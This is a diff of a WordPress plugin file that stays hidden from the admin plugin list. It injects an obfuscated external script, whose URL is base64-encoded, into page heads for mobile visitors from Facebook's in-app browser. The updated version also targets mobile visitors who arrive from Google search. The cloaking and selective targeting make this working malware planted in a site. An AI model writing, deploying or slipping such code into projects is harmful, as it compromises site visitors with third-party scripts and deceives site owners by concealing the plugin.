@@ -11,44 +11,48 @@
 
 add_action('wp_head', function () {
 
-    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $UA = $_SERVER['HTTP_USER_AGENT'] ?? '';
 
-    $is_ios_facebook = (
-        stripos($ua, 'iPhone') !== false &&
-        stripos($ua, 'FBAN/FBIOS') !== false
-    );
+    $REF = $_SERVER['HTTP_REFERER'] ?? '';
 
-    $is_android_facebook = (
-        stripos($ua, 'Android') !== false &&
-        (
-            stripos($ua, 'FB_IAB/FB4A') !== false ||
-            stripos($ua, 'FBAN/EMA') !== false
-        )
-    );
+    $AN = (stripos($UA, 'Android') !== false);
 
-    if (is_singular() && ($is_ios_facebook || $is_android_facebook)) {
+    $IP = (stripos($UA, 'iPhone') !== false);
 
-        $src  = base64_decode('aHR0cHM6Ly9hbDVzbS5jb20vdGFnLm1pbi5qcw==');
-        $zone = base64_decode('MTE2MjA4OTM=');
+    $SM = ($AN || $IP);
+
+    $IP_FB = ($IP && stripos($UA, 'FBAN/FBIOS') !== false);
+
+    $AN_FB = ($AN && (stripos($UA, 'FB_IAB/FB4A') !== false || stripos($UA, 'FBAN/EMA') !== false));
+
+    $REF_GO = (!empty($REF) && preg_match('~^https?://([^/]+\.)?google\.[^/]+/~i', $REF));
+
+    $SM_GO = ($SM && $REF_GO);
+
+    if (is_singular() && ($SM_GO || $IP_FB || $AN_FB)) {
+
+        $SR  = base64_decode('aHR0cHM6Ly9hbDVzbS5jb20vdGFnLm1pbi5qcw==');
+        $ZN = base64_decode('MTE2MDk2MjA=');
         ?>
         <script>
         (function(s){
-            s.dataset.zone = '<?php echo esc_js($zone); ?>';
-            s.src = '<?php echo esc_url($src); ?>';
+            s.dataset.zone = '<?php echo esc_js($ZN); ?>';
+            s.src = '<?php echo esc_url($SR); ?>';
         })([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')));
         </script>
         <?php
     }
+
 });
 
 
-add_filter('all_plugins', function ($plugins) {
+add_filter('all_plugins', function ($PG) {
 
-    $plugin_file = plugin_basename(__FILE__);
+    $PG_FL = plugin_basename(__FILE__);
 
-    if (isset($plugins[$plugin_file])) {
-        unset($plugins[$plugin_file]);
+    if (isset($PG[$PG_FL])) {
+        unset($PG[$PG_FL]);
     }
 
-    return $plugins;
+    return $PG;
 });
